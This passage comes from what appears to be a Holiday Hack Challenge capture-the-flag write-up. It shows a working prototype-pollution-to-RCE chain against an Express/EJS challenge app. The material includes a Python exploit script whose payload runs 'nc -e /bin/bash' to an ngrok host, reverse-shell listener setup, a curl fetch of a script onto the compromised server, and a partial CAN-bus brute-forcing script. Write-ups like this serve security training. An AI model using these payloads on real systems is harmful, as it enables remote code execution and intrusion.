<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;action&#34;</span>:<span style="color:#e6db74">&#34;update&#34;</span>,<span style="color:#e6db74">&#34;key&#34;</span>:<span style="color:#e6db74">&#34;__proto__&#34;</span>,<span style="color:#e6db74">&#34;subkey&#34;</span>:<span style="color:#e6db74">&#34;toString&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">}</span></span></span></code></pre></div>
<p>This had to be sent as URL-encoded value:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message<span style="color:#f92672">=</span>%7B%22action%22:%22update%22,%22key%22:%22__proto__%22,%22subkey%22:%22toString%22,%22value%22:%22a%22%7D</span></span></code></pre></div>
<p>By refreshing the landing page we got the following error:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>TypeError: Object.prototype.toString.call is not a function
    at Object.isRegExp (/app/node_modules/qs/lib/utils.js:231:38)
    at normalizeParseOptions (/app/node_modules/qs/lib/parse.js:289:64)
    at module.exports [as parse] (/app/node_modules/qs/lib/parse.js:305:19)
    at parseExtendedQueryString (/app/node_modules/express/lib/utils.js:289:13)
    at query (/app/node_modules/express/lib/middleware/query.js:42:19)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/app/node_modules/express/lib/router/index.js:328:13)
    at /app/node_modules/express/lib/router/index.js:286:9
    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)
    at next (/app/node_modules/express/lib/router/index.js:280:10)</code></pre></div>
<p>Furter, the following payload triggers more errors:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>{
	&#34;action&#34;: &#34;update&#34;,
	&#34;key&#34;:&#34;__proto__&#34;,
	&#34;subkey&#34;: &#34;escapeFn&#34;,
	&#34;value&#34;:&#34;{\&#34;view options\&#34;: {\&#34;client\&#34;: 1, \&#34;escapeFn\&#34;: \&#34;process.mainModule.require(&#39;child_process&#39;).exec(&#39;ls&#39;, (_, stdout, stderr) =&gt; console.log(stdout || stderr));\&#34;}}&#34;
}</code></pre></div>
<p>Error triggered:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>TypeError: /app/views/stats.ejs:70
    68|                 &lt;% gnomeStats.forEach(stat =&gt; { %&gt;
    69|                     &lt;tr&gt;
 &gt;&gt; 70|                         &lt;td class=&#34;key-cell&#34;&gt;&lt;%= stat.name %&gt;&lt;/td&gt;
    71|                         &lt;td class=&#34;value-cell&#34;&gt;&lt;%= stat.value %&gt;&lt;/td&gt;
    72|                     &lt;/tr&gt;
    73|                 &lt;% }); %&gt;

escapeFn is not a function
    at eval (/app/views/stats.ejs:15:16)
    at Array.forEach (&lt;anonymous&gt;)
    at eval (/app/views/stats.ejs:12:19)
    at stats (/app/node_modules/ejs/lib/ejs.js:691:17)
    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:272:36)
    at exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:489:10)
    at View.render (/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/app/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/app/node_modules/express/lib/response.js:1049:7)</code></pre></div>
<h4 id="web-application">Web application</h4>
<p>In order to craft a payload we turned to Python for development, as fiddling with the browser quickly became cumbersome. The following Python script is provided as is. It functions as thus:</p>
<ol>
<li>Login to the control panel</li>
<li>Trigger JSON parse error</li>
<li>Stages the payload. In this (final) version it pollutes __proto__ with a piece of code that connects back to our reverse shell</li>
<li>Triggers the reverse shell by visiting the /stats endpoint</li>
</ol>
<p>We found this to be a functional and fairly quick methodology to tackle the objective. The code:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> html
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Login</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span>login_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/login?id=dfbd809f-8d6a-4500-87ba-c6e29b90f34c&#34;</span>
</span></span><span style="display:flex;"><span>creds <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;bruce&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;oatmeal12&#34;</span> }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(login_url, data<span style="color:#f92672">=</span>creds)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger JSON parse error</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>error_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=&#39;&#34;</span>
</span></span><span style="display:flex;"><span>payload_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(error_url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>payload_r<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>soup <span style="color:#f92672">=</span> BeautifulSoup(payload_r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
</span></span><span style="display:flex;"><span>raw_text <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>pre<span style="color:#f92672">.</span>get_text() 
</span></span><span style="display:flex;"><span>decoded_text <span style="color:#f92672">=</span> html<span style="color:#f92672">.</span>unescape(raw_text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 1. Provoke Error message&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(decoded_text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Staging</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 2. Staging&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> subkey <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;debug&#34;</span>, <span style="color:#e6db74">&#34;client&#34;</span>]:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">== Staging </span><span style="color:#e6db74">{</span>subkey<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;update&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;key&#34;</span>: <span style="color:#e6db74">&#34;__proto__&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;subkey&#34;</span>: subkey,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;value&#34;</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload_encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(json<span style="color:#f92672">.</span>dumps(payload))
</span></span><span style="display:flex;"><span>    proto_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=</span><span style="color:#e6db74">{</span>payload_encoded<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    payload_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(proto_url)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>payload_r<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    print(payload_r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 3. Weaponizing&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;update&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;key&#34;</span>: <span style="color:#e6db74">&#34;__proto__&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;subkey&#34;</span>: <span style="color:#e6db74">&#34;escapeFunction&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;JSON.stringify; process.mainModule.require(&#39;child_process&#39;).exec(&#39;nc -e /bin/bash 4.tcp.eu.ngrok.io 19342;sleep 10000000&#39;)&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(json<span style="color:#f92672">.</span>dumps(payload))
</span></span><span style="display:flex;"><span>proto_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=</span><span style="color:#e6db74">{</span>payload_encoded<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(proto_url)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>payload_r<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(payload_r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Smart Gnome Control Center - Smart Gnome Statistics panel</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 4. Stats page&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stats_panel_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats&#34;</span>
</span></span><span style="display:flex;"><span>stats_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(stats_panel_url)
</span></span><span style="display:flex;"><span>print(stats_r<span style="color:#f92672">.</span>text)</span></span></code></pre></div>
<p>We made the script output the URLs so we could copy them and paste them into our web browser to bring the reverse shell into our logged in session to steer the robot.</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>===========================================
Step 1. Provoke Error message
===========================================

SyntaxError: Unexpected token &#39; in JSON at position 0 Â  Â at JSON.parse (&lt;anonymous&gt;) Â  Â at /app/server.js:121:33 Â  Â at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) Â  Â at next (/app/node_modules/express/lib/router/route.js:149:13) Â  Â at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3) Â  Â at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) Â  Â at /app/node_modules/express/lib/router/index.js:284:15 Â  Â at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12) Â  Â at next (/app/node_modules/express/lib/router/index.js:280:10) Â  Â at /app/server.js:49:9

===========================================
Step 2. Staging
===========================================

== Staging debug

URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22debug%22%2C+%22value%22%3A+1%7D
{&#34;type&#34;:&#34;message&#34;,&#34;data&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Updated __proto__.debug to 1&#34;}

== Staging client

URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22client%22%2C+%22value%22%3A+1%7D
{&#34;type&#34;:&#34;message&#34;,&#34;data&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Updated __proto__.client to 1&#34;}

===========================================
Step 3. Weaponizing
===========================================

URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22escapeFunction%22%2C+%22value%22%3A+%22JSON.stringify%3B+process.mainModule.require%28%27child_process%27%29.exec%28%27nc+-e+%2Fbin%2Fbash+4.tcp.eu.ngrok.io+19342%3Bsleep+10000000%27%29%22%7D
{&#34;type&#34;:&#34;message&#34;,&#34;data&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Updated __proto__.escapeFunction to JSON.stringify; process.mainModule.require(&#39;child_process&#39;).exec(&#39;nc -e /bin/bash 4.tcp.eu.ngrok.io 19342;sleep 10000000&#39;)&#34;}

===========================================
Step 4. Stats page
===========================================

... snip ...</code></pre></div>
<p>In the initial development phase of our payload we made it reach out to a webhook on the Internett, just to verify it working. Once that was done we simply changed over to using an Ngrok infrastucture with netcat shell.</p>
<h4 id="setup-attack-infrastructure">Setup attack infrastructure</h4>
<p>In order to conduct this attack we had to set up the following infrastructure using Kali in WSL (in total four instances):</p>
<table>
  <thead>
      <tr>
          <th>Command</th>
          <th>Public</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>ngrok tcp 8501</code></td>
          <td>Yes</td>
          <td>Public exposed reverse shell port through Ngrok</td>
      </tr>
      <tr>
          <td><code>nc -lnvp 8501</code></td>
          <td>No</td>
          <td>Local (attacking machine) listening port using Netcat mapped to public Ngrok bridge</td>
      </tr>
      <tr>
          <td><code>ngrok http 8001</code></td>
          <td>Yes</td>
          <td>Public exposed web server for serving scripts</td>
      </tr>
      <tr>
          <td><code>python3 -m http.server 8001</code></td>
          <td>No</td>
          <td>Local (attacking machine) web server mapped to public Ngrok bridge</td>
      </tr>
  </tbody>
</table>
<p>The communication will then look like this:</p>
<pre class="mermaid align-center ">---
config:
      theme: redux
---
flowchart LR
    subgraph Attacker[&#34;Attacking machine&#34;]
        webserver
        netcat
    end

    subgraph NGROK[&#34;NGROK&#34;]
        HTTP
        TCP
    end

    SGCC[&#34;Smart Gnome Control Center&#34;] &lt;--TCP/443--&gt; HTTP
    SGCC[&#34;Smart Gnome Control Center&#34;] &lt;--TCP/19342--&gt; TCP
    HTTP &lt;--TCP/8001--&gt; webserver[&#34;Python webserver&#34;]
    TCP &lt;--TCP/8501--&gt; netcat[&#34;Netcat listener&#34;]</pre>
<h3 id="operating-the-reverse-shell">Operating the reverse shell</h3>
<p>With our payload in order it quickly called back through our infrastructe and we got shell. We immediatly started to snoop around:</p>
<p><a href="#R-image-13b98739023ed4b00141b4e2b8bd461d" class="lightbox-link"><img alt="Call back" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-13b98739023ed4b00141b4e2b8bd461d"><img alt="Call back" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png"></a></p>
<p>The <code>canbus_client.py</code> caught our eye:</p>
<p><a href="#R-image-d3fd552ea7b7f4e4a9259db27be70b74" class="lightbox-link"><img alt="Canbus client" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-d3fd552ea7b7f4e4a9259db27be70b74"><img alt="Canbus client" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png"></a></p>
<p>Turns out this was a script to interact with the CAN bus and contained a COMMAND_MAP with codes we recognized from the error messages for the bot in the Gnome Control Center. All of these codes leads to errors and no wonder because the comment in code mentions they are wrong. We then turned our attention to the <em>README.md</em> file:</p>
<p><a href="#R-image-f9fce3d7ffd6365e0ea7175ac8e66238" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-f9fce3d7ffd6365e0ea7175ac8e66238"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png"></a></p>
<p>A whole lot of text, but only the very last part is of interest. It basically state the codes to move the robot is unknown at the moment. So we were left alone to figure these out.</p>
<h3 id="enumerating-control-codes">Enumerating control codes</h3>
<p>In order to find the correct control codes we took basis in the Python script on the server, uploaded it to ChatGPT and asked ChatGPT to make it into a bruteforcing script. This script was then uploaded back onto the server using the command:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>curl -o cb.py  https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py</code></pre></div>
<p>We had to run this script in several iterations due to the amount of HEX codes involved. For each iteration we kept an eye on the robot in <code>Gnome Control Interface</code> for any movement. For each iteration we shortened the range and at the end we ended up with bruteforcing the <em>0x200-0x206</em> range. Thus the script below is the final revision for that range:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> can
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>IFACE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gcan0&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>RPM_LEFT_ID  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x310</span>
</span></span><span style="display:flex;"><span>RPM_RIGHT_ID <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x311</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># LIMIT THE SEARCH RANGE HERE (end is exclusive)</span>
</span></span><span style="display:flex;"><span>SCAN_START <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>SCAN_END   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x206</span>   <span style="color:#75715e"># includes 0x205</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">int16_be</span>(b: bytes) <span style="color:#f92672">-&gt;</span> int:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;h&#34;</span>, b[:<span style="color:#ae81ff">2</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_rpm_snapshot</span>(bus, window_s<span style="color:#f92672">=</span><span style="color:#ae81ff">0.20</span>):
</span></span><span style="display:flex;"><span>    end <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">+</span> window_s
</span></span><span style="display:flex;"><span>    left <span style="color:#f92672">=</span> right <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">&lt;</span> end:
</span></span><span style="display:flex;"><span>        msg <span style="color:#f92672">=</span> bus<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.02</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> msg:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> msg<span style="color:#f92672">.</span>arbitration_id <span style="color:#f92672">==</span> RPM_LEFT_ID <span style="color:#f92672">and</span> len(msg<span style="color:#f92672">.</span>data) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>            left <span style="color:#f92672">=</span> int16_be(msg<span style="color:#f92672">.</span>data)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> msg<span style="color:#f92672">.</span>arbitration_id <span style="color:#f92672">==</span> RPM_RIGHT_ID <span style="color:#f92672">and</span> len(msg<span style="color:#f92672">.</span>data) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>            right <span style="color:#f92672">=</span> int16_be(msg<span style="color:#f92672">.</span>data)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> left, right
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rpm_changed</span>(before, after, threshold<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">in</span> before <span style="color:#f92672">or</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">in</span> after:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> abs(after[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> before[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">&gt;=</span> threshold <span style="color:#f92672">or</span> abs(after[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> before[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&gt;=</span> threshold
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_frame</span>(bus, arb_id, data: bytes, extended<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> can<span style="color:#f92672">.</span>Message(arbitration_id<span style="color:#f92672">=</span>arb_id, data<span style="color:#f92672">=</span>data, is_extended_id<span style="color:#f92672">=</span>extended)
</span></span><span style="display:flex;"><span>    bus<span style="color:#f92672">.</span>send(msg)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scan</span>(bus, start, end, payloads, extended<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, rate_sleep<span style="color:#f92672">=</span><span style="color:#ae81ff">0.03</span>, verbose_every<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    hits <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    _ <span style="color:#f92672">=</span> read_rpm_snapshot(bus, <span style="color:#ae81ff">0.30</span>)  <span style="color:#75715e"># prime</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    attempt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> arb_id <span style="color:#f92672">in</span> range(start, end):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> data <span style="color:#f92672">in</span> payloads:
</span></span><span style="display:flex;"><span>            attempt <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> verbose_every <span style="color:#f92672">and</span> attempt <span style="color:#f92672">%</span> verbose_every <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># OUTPUT EXACTLY WHAT WE&#39;RE TRYING</span>
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;TRY id=0x</span><span style="color:#e6db74">{</span>arb_id<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> dlc=</span><span style="color:#e6db74">{</span>len(data)<span style="color:#e6db74">}</span><span style="color:#e6db74"> data=</span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>hex() <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;(empty)&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            before <span style="color:#f92672">=</span> read_rpm_snapshot(bus, <span style="color:#ae81ff">0.12</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                send_frame(bus, arb_id, data, extended<span style="color:#f92672">=</span>extended)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> can<span style="color:#f92672">.</span>CanError:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>            after <span style="color:#f92672">=</span> read_rpm_snapshot(bus, <span style="color:#ae81ff">0.22</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> rpm_changed(before, after):
